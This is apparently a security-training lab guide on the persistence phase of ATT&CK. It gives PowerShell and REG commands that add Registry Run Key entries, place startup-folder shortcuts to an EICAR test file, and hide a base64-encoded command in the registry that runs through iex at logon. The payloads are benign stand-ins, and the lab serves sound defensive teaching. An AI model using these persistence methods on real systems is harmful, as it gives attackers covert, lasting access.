---
Title: ATT&CK - Persistence Phase
Description: Introduce post-compromise attack behaviors and EDR defenses
Author: Chris Gerritz, Datto
Created: 04/14/2025
Achievements:
Duration: 15
Range:
- Windows
Applications:
- Terminal (Command prompt)
- PowerShell
- Datto EDR
- SysInternals
External:
- attack.mitre.org
- allitshop.infocyte.com
- www.eicar.org/download/eicar.com.txt
---

## Description

The purpose of these labs is to introduce post-compromise attack behaviors and EDR defenses. We will perform post-compromise behaviors that an attacker would run once they compromised a system within the network.  This system has Datto EDR installed for monitoring so we will be able to view these commands from the defender's perspective as well.

Persistence consists of techniques that adversaries use to keep access to systems across restarts, changed credentials, and other interruptions that could cut off their access. Techniques used for persistence include any access, action, or configuration changes that let them maintain their foothold on systems, such as replacing or hijacking legitimate code or adding startup code.

In Lab 5, we will demonstrate some popular places to place malware references that will cause their malware to keep coming back. Autostart locations like Registry Run Keys or files in User Startup Folders will cause that program to execute when a user logs in or the system reboots. Each autostart may have it’s own trigger for automated execution

---

## Objectives
<!--
- List all objectives for this lab
- Need at least three objectives
- Use blooms taxonomy verbs: KNOWLEDGE,UNDERSTAND, APPLY, ANALYZE, EVALUATE, CREATE
- https://www.teachthought.com/critical-thinking/blooms-taxonomy-verbs-2/
-->
1. Understand the Persistence phase of an attack
2. Demonstate some popular persistence methods and locations
   

## Requirements

|                  |                             |
|------------------|-----------------------------|
| **Range**        | Windows |
| **Applications** | All applications needed     |
| **Needed Files** | None |


## Instructions

Open a new terminal using `c:\Users\Public\rat.exe` or you can use the same terminal from the previous lab. You will be copying and pasting the lab commands into this terminal session.  If you close this window, remember to re-open `c:\Users\Public\rat.exe` before running any of the labs.

w> All labs require you to be running as an administrator. 


### 1. Registry Run Key Foothold
> *The most popular persistence location is to place a reference to your malware file or command in the registry's Run Keys. All files referenced in a run key will execute upon a user logging in to the system, every time they log in.*
>
> We will demonstrate how this might look if the malware was not detected as malware by loading up our calculator. After that we'll try reference some malware using an EICAR file (fake malware that will flag on AV)

Add a path reference to the **Registry Run Keys**. 
- MITRE ATT&CK Technique: [ATT&CK T1547.001 - Persistence - Registry Run Key](https://attack.mitre.org/techniques/T1547/001)
- Copy and paste this command into the terminal:
```PowerShell
Write-Host  -ForegroundColor Cyan "Adding T1547.001 - Registry Run Key Foothold w/ simulated undetectable malware (calc)"
REG ADD "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V "Red Team" /t REG_SZ /F /D "C:\Windows\System32\calc.exe -i $n"
```
- [Optional] Cleanup:
```PowerShell
Write-Host -ForegroundColor Red "Removing T1547.001 - Registry Run Key foothold"
REG DELETE "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V "Red Team" /F
```

### 2. Autostart Folder Shortcut
> *Another popular persistence location is to simply place a shortcut to the malware in the Windows autostart folder. All files referenced here will execute upon a user logging in to the system, every time they log in.*
>
> We will demonstrate this by creating a shortcut to an EICAR file (test malware that will flag on all AV engines) and placing it in either the system startup folder or user startup folder:
>
> C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\*.lnk
> OR
> $env:USERPROFILE\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\*.lnk


Add a shortcut to malware in the **Autostart Folder**
- MITRE ATT&CK Technique: [ATT&CK T1547.009 - Persistence - Autostart Folder](https://attack.mitre.org/techniques/T1547/009)
- Copy and paste this command into the terminal:
```PowerShell
# Autostart Folder with EICAR test string
Write-Host -ForegroundColor Cyan "Adding T1547.009 - Malicious Shortcut Link Persistence with detectable malware (EICAR File)"
Write-Host -ForegroundColor Cyan "Writing EICAR file manually..."

$EICARString = 'X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*'
$EICARString | Out-File -Encoding ASCII -FilePath "$env:USERPROFILE\EICAR.exe" -Force
$startupShortcut = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\evil_calc.lnk"
$desktopShortcut = "$env:USERPROFILE\Desktop\evil_calc.lnk"

$cmd = @"
`$WScriptShell = New-Object -ComObject WScript.Shell
`$Shortcut1 = `$WScriptShell.CreateShortcut('$startupShortcut')
`$Shortcut1.TargetPath = '$env:USERPROFILE\EICAR.exe'
`$Shortcut1.Save()

`$Shortcut2 = `$WScriptShell.CreateShortcut('$desktopShortcut')
`$Shortcut2.TargetPath = '$env:USERPROFILE\EICAR.exe'
`$Shortcut2.Save()
"@

$cmd += "`nStart-Sleep -m $n"

powershell.exe -NoProfile -Command $cmd
```


### 3. Fileless Runkey Persistence
> *A more advanced form of persistence won't reference a file on disk, it will hide encoded and obfuscated code in the registry somewhere and run the command using the same persistence method.*
>
> *We will demonstrate this by encoding a simple command and placing that content in a random registry location. Then we will have the runkeys start powershell and execute that content. Any scan of the runkeys will just show a powershell command.*


Create a fileless reference in the **Registry Run Keys**
- MITRE ATT&CK Technique: [ATT&CK T1547.001 - Persistence - Registry Run Key](https://attack.mitre.org/techniques/T1547/001)
- Copy and paste this command into the terminal:
```PowerShell
# Autostart Folder with EICAR file
Write-Host -ForegroundColor Cyan "Adding T1547.001 - Registry Run Key w/ Fileless Powershell Command"
$Cmd = "Write-Host -ForegroundColor Green 'Mess with the Best, Die like the rest!'; Start-Sleep -m $n"
$EncodedCommand = [Convert]::ToBase64String([System.Text.Encoding]::ASCII.GetBytes($Cmd))
# Add encoded Command to random registry location
REG ADD "HKEY_CURRENT_USER\Software\Classes\RedTeamTest" /v RT /t REG_SZ /d $EncodedCommand /f

# Add powershell reference to registry run key that will have it grab and execute the encoded command hidden in the registry
$cmd = "iex ([Text.Encoding]::ASCII.GetString([Convert]::FromBase64String((gp `"HKCU:\Software\Classes\RedTeamTest`").RT))); Start-Sleep -m $n"
REG ADD "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V "Red Team Fileless" /t REG_SZ /F /D "powershell.exe -nop -command '$cmd'"
#Remove-Item HKCU:\Software\Classes\RedTeamTest -Force -ErrorAction Ignore
```

- Go ahead and run the command hidden in the registry now:
```Powershell
# Run the command from the registry on demand:
$cmd = "iex ([Text.Encoding]::ASCII.GetString([Convert]::FromBase64String((gp `"HKCU:\Software\Classes\RedTeamTest`").RT))); Start-Sleep -m $n"
powershell.exe -nop -command $cmd
```
s> If you are successful, powershell will display a message in green.
